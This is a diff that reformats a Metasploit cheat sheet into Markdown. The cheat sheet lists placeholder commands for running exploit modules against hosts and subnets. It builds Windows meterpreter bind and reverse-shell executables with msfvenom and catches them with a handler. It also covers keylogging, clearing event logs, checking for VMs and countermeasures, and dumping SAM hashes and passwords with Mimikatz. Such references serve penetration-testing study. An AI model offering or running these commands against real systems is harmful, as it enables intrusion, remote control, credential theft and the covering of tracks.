@@ -1,10 +1,14 @@
+# Metasploit
+```
 msfconsole
 search {Product} {Version}
 use {Modules Name}
 options
 set rhost {IP}
 execute
+```
 
+```
 msfconsole
 search {keyword}
 use {Modules Name}
@@ -14,20 +18,24 @@ set lhost {IP}
 show payloads
 set payload {payload}
 exploit
+```
 
+```
 msfconsole
 search {keyword}
 use {Modules Name}
 set RHOSTS {subnet}
 set THREATS 10
 run
+```
 
-info {Modules Name}
+`info {Modules Name}`
 
-show exploits
+`show exploits`
 
-jobs -K
+`jobs -K`
 
+```
 meterpreter > shell
 meterpreter > run checkvm
 meterpreter > run getcountermeasure
@@ -40,7 +48,9 @@ meterpreter > keyscan_dump
 meterpreter > run getgui -h
 meterpreter > clearev
 meterpreter > quit
+```
 
+```
 msfvenom -p windows/meterpreter/bind_tcp -f exe > {Path}
 msfconsole
 use exploit/multi/handler
@@ -48,7 +58,9 @@ set payload windows/meterpreter/bind_tcp
 set rhost {IP}
 set lport {port}
 exploit
+```
 
+```
 msfvenom -p windows/meterpreter/reverse_tcp lhost={IP} lport={port} -f exe > {Path}
 msfconsole
 use exploit/multi/handler
@@ -56,7 +68,9 @@ set payload windows/meterpreter/reverse_tcp
 set lhost {IP}
 set lport {port}
 exploit
+```
 
+```
 msfvenom -p windows/meterpreter/reverse_https lhost={IP} lport=443 -f exe > {Path}
 msfconsole
 use exploit/multi/handler
@@ -64,10 +78,13 @@ set payload windows/meterpreter/reverse_https
 set lhost {IP}
 set lport 443
 exploit
+```
 
-msfvenom -p windows/shell_hidden_bind_tcp ahost={IP} lport={port} -f exe > {Path}
-nc {IP} {port}
+`msfvenom -p windows/shell_hidden_bind_tcp ahost={IP} lport={port} -f exe > {Path}`
 
+`nc {IP} {port}`
+
+```
 meterpreter > load Mimikatz
 mimikatz_command -f version
 help mimikatz
@@ -75,3 +92,4 @@ msv
 kerberos
 mimikatz_command -f samdump::hashes
 mimikatz_command -f sekurlsa::searchPasswords
+```
